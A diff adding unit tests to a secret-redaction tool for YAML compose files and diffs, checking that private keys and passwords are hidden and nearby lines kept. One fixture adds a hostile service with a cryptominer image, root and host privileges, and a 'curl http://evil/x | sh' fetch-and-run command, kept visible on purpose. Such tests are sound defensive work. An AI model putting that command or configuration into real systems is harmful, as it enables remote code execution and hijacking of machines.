@@ -352,3 +352,62 @@ describe('fifth pass', () => {
     hides(sanitizeServerMessage(`invalid: ${'p'.repeat(60_000)}${compose}`, documentSecrets(compose)));
   });
 });
+
+/** Sixth pass: the continuation of a command, and key blocks inside quotes. */
+describe('sixth pass', () => {
+  const KEY = 'MIIEs3cr3tAAAA1111bbbb2222';
+
+  it('a key block written out by a continued command is hidden; the command goes on after it', () => {
+    const out = redactDocument(doc(
+      '    command: "sh -c \'printf %b \\"\\',
+      '      -----BEGIN PRIVATE KEY-----\\n\\',
+      `      ${KEY}\\n\\`,
+      '      -----END PRIVATE KEY-----\\" > /run/key.pem && exec app\'"',
+      '    image: x',
+    ));
+    hides(out, KEY);
+    expect(out).toContain('image: x');
+    hides(redactDocument(doc("    entrypoint: sh -c 'echo \"", '      -----BEGIN OPENSSH PRIVATE KEY-----', `      ${KEY}`, '      -----END OPENSSH PRIVATE KEY-----" > /k && exec app\'')), KEY);
+  });
+
+  it('a `password: …` line written out by a continued command loses its value', () => {
+    const out = redactDocument(doc('    command: "sh -c \'printf \\"user: admin\\n', `      password: ${S}\\n\\" > /etc/app.yml && exec app'"`, '    image: x'));
+    hides(out);
+    expect(out).toContain('user: admin');
+    expect(out).toContain('image: x');
+  });
+
+  it('a flag at the end of a line inside a quote left open waits for the next line', () => {
+    hides(redactDocument(doc('    command: "redis-server --appendonly yes --requirepass', `      ${S}"`, '    image: redis:7')));
+    hides(redactDocument(doc('    command: sh -c "redis-server --requirepass', `      ${S} --appendonly yes"`)));
+    unchanged(doc('    command: "redis-server --appendonly', '      yes --save 60 1"', '    image: redis:7'));
+  });
+
+  it('a key block in a quoted scalar is hidden to the closing quote, header lines and under-indented lines included', () => {
+    const pgp = redactDocument(doc('    environment:', '      GPG_KEY: "', '-----BEGIN PGP PRIVATE KEY BLOCK-----', 'Version: GnuPG v2', '', KEY, '-----END PGP PRIVATE KEY BLOCK-----"', '    image: x'));
+    hides(pgp, KEY);
+    hides(pgp, 'GnuPG');
+    expect(pgp).toContain('image: x');
+    const rsa = redactDocument(doc('      SSH_KEY: "key follows', '      -----BEGIN RSA PRIVATE KEY-----', '      Proc-Type: 4,ENCRYPTED', '      DEK-Info: AES-256-CBC,ABCD', '', `      ${KEY}`, '      -----END RSA PRIVATE KEY-----"', '    image: x'));
+    hides(rsa, KEY);
+    expect(rsa).toContain('image: x');
+  });
+
+  it('an under-indented multi-line quoted value is the value to its closing quote', () => {
+    const out = redactDocument(doc('    environment:', '      MOTD: "Hello', `login: ${S}`, `then ${S}`, 'bye"', '      PORT: 3000'));
+    hides(out);
+    expect(out).toContain('PORT: 3000');
+  });
+
+  it('a marker alone on a line under a key hides nothing left of it', () => {
+    const base = ['services:', '  app:', '    image: nginx:1.27'];
+    const added = ['    x-note:', '      -----BEGIN PRIVATE KEY-----', '    image: evil/miner:latest', '    privileged: true', '    pid: host', '    user: root', '    command: sh -c "curl http://evil/x | sh"'];
+    const diff = formatRedactedDiff(base.join('\n'), [...base.slice(0, 2), ...added].join('\n')).join('\n');
+    for (const line of ['evil/miner:latest', 'privileged: true', 'pid: host', 'user: root', 'curl http://evil/x | sh']) expect(diff, line).toContain(line);
+  });
+
+  it('armor headers are not counted: a block with many of them stays hidden', () => {
+    const headers = Array.from({ length: 9 }, (_, i) => `      Comment: line ${i}`);
+    hides(redactDocument(doc('    key: |', '      -----BEGIN PGP PRIVATE KEY BLOCK-----', ...headers, '', `      ${KEY}`, '      -----END PGP PRIVATE KEY BLOCK-----')), KEY);
+  });
+});
